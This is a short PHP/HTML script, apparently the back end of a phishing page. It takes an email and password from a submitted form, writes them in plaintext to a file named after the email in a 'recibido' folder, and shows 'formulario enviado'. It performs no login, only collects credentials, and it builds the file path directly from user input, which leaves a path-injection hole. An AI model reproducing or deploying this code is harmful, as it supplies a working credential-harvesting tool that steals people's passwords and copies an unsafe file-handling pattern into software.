<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <?php
        $email = $_POST["email"];
        $password = $_POST["pass"];

        $contenido="
        Email: $email
        Contraseña: $password
        ";

        $archivo=fopen("recibido/$email.txt","w");
        fwrite($archivo,$contenido);
    ?>
</head>
<body>
    <h1><br><br><br><br><br><center>formulario enviado</center></h1>
</body>
</html>